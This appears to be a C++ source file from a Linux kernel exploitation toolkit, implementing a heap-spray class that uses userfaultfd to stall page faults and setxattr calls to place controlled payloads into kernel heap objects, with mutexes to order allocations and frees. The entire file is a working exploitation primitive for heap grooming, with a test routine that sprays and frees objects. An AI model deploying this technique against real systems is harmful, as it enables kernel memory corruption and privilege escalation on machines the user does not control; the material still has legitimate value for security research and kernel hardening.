#define _GNU_SOURCE
#include "heap_fs.h"

#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define MIN(X, Y) ((X) >= (Y) ? (Y) : (X))
#define MAX(X, Y) ((X) >= (Y) ? (X) : (Y))

struct spray_argv {
    void *addr;
    void *page_fault;
    int id;
    int fd;
    int objs_num;
    HeapSpray *obj;
};

struct setxattr_argv {
    void *value;
    size_t size;
};

HeapSpray::HeapSpray()
{
    order_lock = (pthread_mutex_t *)malloc(sizeof(pthread_mutex_t));
}

void *
HeapSpray::fault_handler_thread(void *arg)
{
    struct uffd_msg msg;   /* Data read from userfaultfd */
    int fault_cnt = 0;     /* Number of faults so far handled */
    long uffd, id;  
    char *page;    
    void *addr;       
    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = ((struct spray_argv*)arg)->fd;
    page = (char *)((struct spray_argv*)arg)->page_fault;
    addr = ((struct spray_argv*)arg)->addr;
    id = ((struct spray_argv*)arg)->id;
    HeapSpray *obj = ((struct spray_argv*)arg)->obj;

#ifdef DEBUG
    printf("id %d enter fault_handler_thread\n", id);
#endif
    /* Create a page that will be copied into the faulting region */

    /* Loop, handling incoming events on the userfaultfd
        file descriptor */
    for (;;) {
        /* See what poll() tells us about the userfaultfd */
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);
        if (nready == -1)
            errExit("poll");

        /* Read an event from the userfaultfd */

        nread = read(uffd, &msg, sizeof(msg));
        if (nread == 0) {
            printf("EOF on userfaultfd!\n");
            exit(EXIT_FAILURE);
        }

        if (nread == -1)
            errExit("read");

        /* We expect only one kind of event; verify that assumption */

        if (msg.event != UFFD_EVENT_PAGEFAULT) {
            fprintf(stderr, "Unexpected event on userfaultfd\n");
            exit(EXIT_FAILURE);
        }

#ifdef DEBUG
        printf("[+] hang->%ld from pagefault [0x%llx-0x%llx]\n", id, msg.arg.pagefault.address-payloadSize, msg.arg.pagefault.address);
#endif
        pthread_mutex_unlock(obj->order_lock);
        pthread_mutex_lock(obj->lock[id]); 
#ifdef DEBUG
        printf("[+] unlock->%ld from pagefault [0x%llx-0x%llx]\n", id, msg.arg.pagefault.address-payloadSize, msg.arg.pagefault.address);
#endif

        /* Display info about the page-fault event */

        uffdio_copy.src = (unsigned long) page;

        /* We need to handle page faults in units of pages(!).
          So, round faulting address down to page boundary */

        uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                          ~(obj->page_size - 1);
        uffdio_copy.len = obj->page_size;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
            errExit("ioctl-UFFDIO_COPY");

        pthread_mutex_unlock(obj->order_lock);
    }
}

void HeapSpray::init_heap_spray(int _objectSize, char* _payload, int _payloadSize) {
    default_objs_num = OBJS_EACH_ROUND;
    if (_payloadSize >= _objectSize) {
        printf("[-] The length of payload should not exceed the object");
        exit(0);
    }
    objectSize = _objectSize;
    payloadSize = _payloadSize;

    printf("[+] objectSize: %ld\n", objectSize);
    printf("[+] payloadSize: %ld\n", payloadSize);

    fengshuiPayload = (char *)malloc(_payloadSize+1);
    memcpy(fengshuiPayload, _payload, _payloadSize);
    pthread_mutex_init(order_lock, NULL);
}

void HeapSpray::do_heap_spray(int loop) {
    if (objectSize == 0) {
        printf("[-] objectSize is zero");
        return;
    }

    if (payloadSize == 0) {
        printf("[-] payloadSize is zero");
        return;
    }

    printf("[+] Prepare for heap fengshui...\n");
    fork_and_spray(loop, default_objs_num, 0, 1);
    printf("[+] Prepare for heap fengshui...Done\n");
    sleep(MAX(1, default_objs_num/50));
}

void *HeapSpray::spray_setxattr(void *arg) {
    void *addr = ((struct setxattr_argv*)arg)->value;
    size_t size = ((struct setxattr_argv*)arg)->size;

    syscall(__NR_setxattr, "./", "exp", addr, size, 0);
}

void *HeapSpray::spray(void* arg) {
    pthread_t thr;  
    void *addr = ((struct spray_argv*)arg)->addr;
    int s;
    int round = ((struct spray_argv*)arg)->objs_num;
    HeapSpray *obj = ((struct spray_argv*)arg)->obj;

    s = pthread_create(&thr, NULL, (THREADFUNCPTR)&fault_handler_thread, (void *) arg);
    if (s != 0) {
        errno = s;
        errExit("pthread_create");
    }

    struct setxattr_argv *setxattr_arg = (struct setxattr_argv *)malloc(sizeof(struct setxattr_argv));
    setxattr_arg->size = obj->objectSize;
    setxattr_arg->value = (void *)(addr + obj->page_size - obj->payloadSize);

#ifdef DEBUG
    printf("going to spray %d round\n", round);
#endif
    for (int i=0; i<round; i++)
          pthread_create(&thr, NULL, spray_setxattr, (void *) setxattr_arg);
}

void HeapSpray::do_free(u_int64_t val) {
    if (val < 512) {
        u_int64_t id = val;
        pthread_mutex_lock(order_lock);
        pthread_mutex_unlock(lock[id]);
#ifdef DEBUG
        printf("free->%ld\n", id);
#endif
    } else {
        pthread_mutex_t *lock_addr = (pthread_mutex_t *)val;
        pthread_mutex_lock(order_lock);
        pthread_mutex_unlock(lock_addr);
    }
}

void HeapSpray::fork_and_spray(int round, int objs_each_round, int shade, int new_page) {
    spray_data[0] = init_pages();
    char *payload = (char *)malloc(payloadSize + 1);
    for (i=0; i < MIN(round, MAX_ROUND); i++) {
        lock[i] = (pthread_mutex_t *)malloc(sizeof(pthread_mutex_t));
        if (new_page)
            spray_data[i] = init_pages();
        else
            spray_data[i] = spray_data[0];

        memcpy(payload, fengshuiPayload, payloadSize);
        if (shade) {
            for (int j=0; j<payloadSize; j++) {
                payload[j] += i + 1;
            }
        }
        int uffd = init_userfaultfd(spray_data[i], payload, payloadSize);
#ifdef DEBUG
        //printf("feed payload->%16s...\n", payload);
#endif
        if (page == NULL) {
            page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            if (page == MAP_FAILED)
                errExit("mmap");
        }

        if (pthread_mutex_init(lock[i], NULL) != 0) { 
            printf("\n mutex init has failed\n"); 
            return; 
        }
        
        pthread_mutex_lock(order_lock);
#ifdef DEBUG
        printf("id->%d released\n", i);
#endif
        pthread_mutex_lock(lock[i]);

        pthread_t thr;
        struct spray_argv *arg = (struct spray_argv *)malloc(sizeof(struct spray_argv));
        arg->id = i;
        arg->addr = spray_data[i];
        arg->fd = uffd;
        arg->page_fault = page;
        arg->objs_num = objs_each_round;
        arg->obj = this;
        pthread_create(&thr, NULL, spray, (void *) arg);
    }
}

void *HeapSpray::init_pages() {
    page_size = sysconf(_SC_PAGE_SIZE);
    void *base;

    void *addr = mmap(NULL, 2 * page_size, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (addr == MAP_FAILED)
        errExit("mmap");
    return addr;
}

int HeapSpray::init_userfaultfd(void *addr, char *payload, int size) {
    long uffd;                
    unsigned long len;
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;

    len = 2 * page_size;

    /* Create and enable userfaultfd object */

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
        errExit("userfaultfd");

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
        errExit("ioctl-UFFDIO_API");
    

    memcpy(addr + page_size - payloadSize, payload, size);

    void *n_addr = (void *)((unsigned long) addr + page_size);

    /* Register the memory range of the mapping we just created for
        handling by the userfaultfd object. In mode, we request to track
        missing pages (i.e., pages that have not yet been faulted in). */

    uffdio_register.range.start = (unsigned long) n_addr;
    uffdio_register.range.len = page_size;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
        errExit("ioctl-UFFDIO_REGISTER");
    return uffd;
};

void HeapSpray::change_payload(char* payload, int size) {
    if (size >= payloadSize) {
        fengshuiPayload = (char *)malloc(size+1);
    }
    payloadSize = size;
    memcpy(fengshuiPayload, payload, payloadSize);
}

#ifdef TEST
int main()
{
  HeapSpray hs = HeapSpray();
  char *fengshuiPayload = "\x42\x42\x42\x42\x42\x42\x42\x42";
  hs.init_heap_spray(128, fengshuiPayload, 8);
  //hs.do_heap_spray(5);
  hs.do_spray(10, 0);
  hs.do_free(1);
  hs.do_free(2);
  hs.do_free(3);
  hs.do_free(4);
  hs.do_free(5);
  usleep(500);
  hs.do_spray(5, 0);
  sleep(300);
}
#endif